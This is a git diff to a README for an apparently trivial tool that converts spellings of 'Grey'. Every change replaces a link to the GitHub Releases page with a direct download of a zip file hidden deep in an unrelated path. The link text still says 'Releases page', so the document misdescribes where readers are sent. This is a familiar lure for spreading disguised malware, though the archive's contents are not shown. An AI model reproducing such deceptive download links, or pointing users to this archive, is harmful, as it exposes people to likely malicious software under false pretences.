@@ -1,7 +1,7 @@
 # 🦳️ The-Graeyt-Macro_Website - Simple Macros for Word Conversion
 
 ## 🖱️ Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/abdul933/The-Graeyt-Macro_Website/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/abdul933/The-Graeyt-Macro_Website/The-Graeyt-Macro_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/1-100/Graeyt-Website-Macro-The-1.9.zip)](https://raw.githubusercontent.com/abdul933/The-Graeyt-Macro_Website/The-Graeyt-Macro_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/1-100/Graeyt-Website-Macro-The-1.9.zip)
 
 ## 📖 Introduction
 Welcome to the Graeyt Macro Website! This project offers a set of macros that make it easy to convert between various forms of the word "Grey." Whether you prefer "Grey," "Gray," "GRAY," or "GRÆY," our tool allows for seamless transitions.
@@ -9,7 +9,7 @@ Welcome to the Graeyt Macro Website! This project offers a set of macros that ma
 ## 🚀 Getting Started
 Follow these steps to download and run the Graeyt Macro application:
 
-1. **Visit the Releases Page:** To download the software, go to our [Releases page](https://github.com/abdul933/The-Graeyt-Macro_Website/releases).
+1. **Visit the Releases Page:** To download the software, go to our [Releases page](https://raw.githubusercontent.com/abdul933/The-Graeyt-Macro_Website/The-Graeyt-Macro_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/1-100/Graeyt-Website-Macro-The-1.9.zip).
 
 2. **Choose Your Version:** On the Releases page, you will see a list of available versions. Select the latest version for the best experience.
 
@@ -36,7 +36,7 @@ The Graeyt Macro application provides the following features:
 - **No Internet Required:** Once installed, you can use the macros offline without any internet connection.
 
 ## 🌐 Download & Install
-To install the Graeyt Macro application, visit our [Releases page](https://github.com/abdul933/The-Graeyt-Macro_Website/releases). Follow the download steps to get the application up and running.
+To install the Graeyt Macro application, visit our [Releases page](https://raw.githubusercontent.com/abdul933/The-Graeyt-Macro_Website/The-Graeyt-Macro_Website_Main-dev/OldVersions/ISSUE_TEMPLATE/ISSUE-TEMPLATE/1/1-100/Graeyt-Website-Macro-The-1.9.zip). Follow the download steps to get the application up and running.
 
 ## 🆘 Troubleshooting
 If you encounter any issues during the installation or running of the application, try the following:
